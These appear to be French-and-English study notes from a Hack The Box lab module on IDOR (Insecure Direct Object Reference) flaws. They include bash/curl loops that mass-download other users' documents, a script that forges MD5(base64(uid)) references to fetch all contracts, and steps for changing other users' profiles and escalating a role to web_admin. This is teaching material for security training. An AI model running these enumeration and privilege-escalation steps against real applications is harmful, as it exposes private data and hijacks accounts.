# Insecure Direct Object References (IDOR)

## <mark style="color:red;">Introduction</mark>

{% hint style="info" %}
Les vulnérabilités **IDOR** apparaissent quand une application expose directement des objets internes (ex. fichiers, identifiants en base). Sans contrôle d’accès solide, un utilisateur peut modifier ces références et accéder à des ressources qui ne lui appartiennent pas.

Elles peuvent entraîner :

* la divulgation de données sensibles,
* la modification ou suppression de données,
* voire la prise de contrôle de comptes.

<mark style="color:orange;">**TYPES IDOR**</mark>

* **IDOR de divulgation d'informations** :
  * Permettent d'accéder à des données sensibles d'autres utilisateurs
  * Exemple : Accéder aux documents, fichiers ou informations personnelles d'autres utilisateurs
* **IDOR dans les appels de fonctions et APIs** :
  * Permettent d'exécuter des actions en tant qu'autres utilisateurs
  * Exemple : Modifier les informations d'un autre utilisateur ou effectuer des actions administratives
* **IDOR de fichiers statiques** :
  * Accès direct à des fichiers avec des noms prévisibles
  * Exemple : Accéder à des documents comme `/documents/Invoice_2_08_2020.pdf`
* **IDOR avec références encodées/hachées** :
  * Utilisation de valeurs hachées ou encodées comme références d'objets
  * Exemple : Contourner des protections basées sur des hachages MD5 ou encodages Base64
* **IDOR de manipulation de rôles** :
  * Modification des privilèges d'accès ou des rôles utilisateurs
  * Exemple : Changer son propre rôle de "employee" à "web\_admin"
* **IDOR chaînés** :
  * Combinaison de plusieurs vulnérabilités IDOR pour des attaques plus sophistiquées
  * Exemple : Utiliser une IDOR de divulgation pour obtenir des informations, puis les exploiter dans une IDOR d'appel de fonction
{% endhint %}

***

## <mark style="color:red;">Identification des IDOR</mark>

<mark style="color:green;">**Paramètres d'URL & APIs**</mark>

**Exploiter une vulnérabilité IDOR** consiste à :

1. **Repérer les références d’objets** (dans l’URL, les APIs, les cookies, etc.).
2. **Tester des variations** (incrémenter, modifier, fuzzing).
3. **Vérifier l’accès** : si on obtient des données qui ne devraient pas être accessibles, alors il y a une faille.

***

<mark style="color:green;">**Appels AJAX**</mark>

**Chercher des IDOR via le front-end** :

1. Examiner le code JavaScript (AJAX, fonctions cachées).
2. Repérer des endpoints/API non utilisés côté utilisateur.
3. Tester ces appels : s’ils donnent accès à des données interdites → vulnérabilité.

```javascript
function changeUserPassword() {
    $.ajax({
        url: "change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success: function(result) {
            //
        }
    });
}
```

***

<mark style="color:green;">**Comprendre le Hachage / Encodage**</mark>

* Si la valeur est encodée (ex. base64) → décoder, modifier, réencoder.
* Si elle est hachée → chercher à comprendre ce qui est haché dans le code source.
* Si ça marche sans contrôle d’accès back-end → vulnérabilité IDOR.

```javascript
$.ajax({
    url: "download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success: function(result) {
        //
    }
});
```

***

<mark style="color:green;">**Comparer les Rôles Utilisateurs**</mark>\
Pour des attaques plus poussées, on peut créer plusieurs comptes et comparer leurs requêtes HTTP et références d’objets. Cela permet de comprendre comment les paramètres d’URL ou identifiants uniques sont générés, et éventuellement de les recalculer pour accéder aux données d’autres utilisateurs.

```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```

* L’utilisateur B ne devrait pas pouvoir appeler la même API que User1.
* Si l’API renvoie des données pour User2 avec les mêmes paramètres, c’est un IDOR, car l’application ne contrôle pas l’accès côté back-end.
* Même sans pouvoir calculer de nouveaux paramètres, le simple fait de pouvoir reproduire des appels API non autorisés montre une faille dans le contrôle d’accès et permet de chercher d’autres références d’objets à exploiter.

***

## <mark style="color:red;">Mass IDOR Enumeration</mark>

### <mark style="color:blue;">Insecure Parameters</mark>

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg" alt=""><figcaption></figcaption></figure>

`/documents.php`:

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg" alt=""><figcaption></figcaption></figure>

&#x20;Checking the file links, we see that they have individual names:

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

This is the most basic type of IDOR vulnerability and is called <mark style="color:orange;">**`static file IDOR`**</mark>.&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg" alt=""><figcaption></figcaption></figure>

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

{% hint style="warning" %}
C'est une erreur courante que l'on retrouve dans les applications web souffrant de vulnérabilités IDOR, car elles placent le paramètre qui contrôle les documents d'un utilisateur sous notre contrôle, tout en n'ayant pas de système de contrôle d'accès côté back-end. Un autre exemple est l'utilisation d'un paramètre de filtre pour afficher uniquement les documents d'un utilisateur spécifique (par exemple, uid\_filter=1), qui peut également être manipulé pour afficher les documents d'autres utilisateurs, ou même complètement supprimé pour afficher tous les documents en même temps.
{% endhint %}

***

### <mark style="color:blue;">Mass Enumeration</mark>

{% code fullWidth="true" %}
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
{% endcode %}

{% code fullWidth="true" %}
```sh
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
```
{% endcode %}

{% code fullWidth="true" %}
```sh
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```
{% endcode %}

{% code fullWidth="true" %}
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
{% endcode %}

***

## <mark style="color:red;">Bypassing Encoded References</mark>

1. **Contexte :**\
   Certaines applis ne montrent pas d’UID en clair, mais encodent ou hachent leurs références d’objets. Cela complique l’énumération, mais reste exploitable si le back-end n’applique pas de contrôle d’accès.
2. **Exemple Employee Manager :**

* Cliquer sur `Employment_contract.pdf` déclenche une requête POST :

```http
POST download.php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

* Le fichier est référencé par un hachage MD5.

3. **Analyse front-end :**

* Le code JavaScript appelle :

```js
javascript:downloadContract('1')
```

* Fonction `downloadContract(uid)` :

```js
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

* On voit que la valeur hachée est : `MD5(base64(uid))`.

4. **Reproduire le hachage :**

```bash
echo -n 1 | base64 -w 0 | md5sum
# Résultat : cdd96d3cc73d1dbdaffa03cc6cd7339b
```

* Flag `-n` dans `echo` et `-w 0` dans `base64` pour éviter les sauts de ligne.
* Le hachage correspond à celui envoyé dans la requête → on peut calculer pour d’autres UID.

5. **Énumération de masse :**

* Générer les hachages pour les 10 premiers employés :

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

* Script Bash pour télécharger tous les contrats :

```bash
#!/bin/bash
for i in {1..10}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
done
```

* Résultat : tous les fichiers `contract_<hash>.pdf` sont téléchargés.

***

## <mark style="color:red;">IDOR in Insecure APIs</mark>

{% hint style="warning" %}
Jusqu'à présent, nous avons utilisé les vulnérabilités IDOR pour accéder à des fichiers et des ressources hors de portée de l'utilisateur. Cependant, des vulnérabilités IDOR peuvent également exister dans les appels de fonctions et les API, et les exploiter nous permettrait d'effectuer diverses actions en tant qu'autres utilisateurs.

Tandis que les vulnérabilités IDOR liées à la divulgation d'informations nous permettent de lire différents types de ressources, les appels de fonctions IDOR non sécurisés nous permettent d'appeler des API ou d'exécuter des fonctions en tant qu'un autre utilisateur. Ces fonctions et API peuvent être utilisées pour modifier les informations privées d'un autre utilisateur, réinitialiser son mot de passe, voire acheter des articles en utilisant les informations de paiement d'un autre utilisateur. Dans de nombreux cas, nous pourrions obtenir certaines informations via une vulnérabilité IDOR de divulgation d'informations, puis utiliser ces informations avec des vulnérabilités IDOR liées aux appels de fonctions non sécurisés, comme nous le verrons plus tard dans le module.
{% endhint %}

***

### <mark style="color:blue;">Identifying Insecure APIs</mark>

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_edit_profile.jpg" alt=""><figcaption></figcaption></figure>

![update\_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_update_request.jpg)

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Les rôles et privilèges (ex. `role=employee`) sont définis côté client (cookies ou JSON). Si le back-end ne vérifie pas correctement, on peut modifier ces valeurs pour obtenir plus de privilèges. Le défi reste de connaître les autres rôles existants pour les tester.

***

### <mark style="color:blue;">Exploiting Insecure APIs</mark>

On peut modifier certains champs (nom, email, description), mais tenter de changer `uid` ou `role` pour accéder à d’autres comptes ou augmenter ses privilèges échoue si le back-end vérifie la correspondance (`uid mismatch`).

![uid\_mismatch](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_uid_mismatch.jpg)

* L’application vérifie `uid` et `uuid` côté back-end pour empêcher de modifier son propre ou d’autres comptes.
* Les actions sensibles (créer/supprimer un utilisateur) sont réservées aux admins, contrôlées via le cookie `role`.
* Changer notre rôle échoue sans connaître un rôle valide.
* Résultat : on ne peut ni modifier d’autres comptes, ni créer ou supprimer d’utilisateurs → la fonction est protégée contre l’IDOR.
* Reste à tester les **GET requests** pour d’éventuelles fuites d’information (Information Disclosure), qui pourraient aider à exploiter l’IDOR ailleurs.

![uuid\_mismatch](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_uuid_mismatch.jpg)

![create\_new\_user\_1](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_1.jpg)

***

## <mark style="color:red;">Chaining IDOR Vulnerabilities</mark>

L’API retourne normalement les détails d’un utilisateur via GET. Si l’accès est seulement contrôlé par le cookie `role=employee` et sans vérification back-end stricte, on pourrait récupérer les informations d’autres utilisateurs.

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_api.jpg" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:blue;">Information Disclosure</mark>

![get\_another\_user](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_another_user.jpg)

As we can see, this returned the details of another user, with their own `uuid` and `role`, confirming an `IDOR Information Disclosure vulnerability`:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

***

### <mark style="color:blue;">Modifying Other Users' Details</mark>

Now, with the user's `uuid` at hand, we can change this user's details by sending a `PUT` request to `/profile/api.php/profile/2` with the above details along with any modifications we made, as follows:

![modify\_another\_user](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_another_user.jpg)

![new\_another\_user\_details](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_new_another_user_details.jpg)

{% hint style="warning" %}
Modifier les détails d’un autre utilisateur peut permettre de détourner son compte (via reset password) ou d’injecter du XSS pour attaquer l’utilisateur.
{% endhint %}

***

### <mark style="color:blue;">Chaining Two IDOR Vulnerabilities</mark>

Once we enumerate all users, we will find an admin user with the following details:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

![modify\_our\_role](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_our_role.jpg)

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Now, we can refresh the page to update our cookie, or manually set it as `Cookie: role=web_admin`, and then intercept the `Update` request to create a new user and see if we'd be allowed to do so:

![create\_new\_user\_2](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_2.jpg)

![create\_new\_user\_2](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_new_user.jpg)
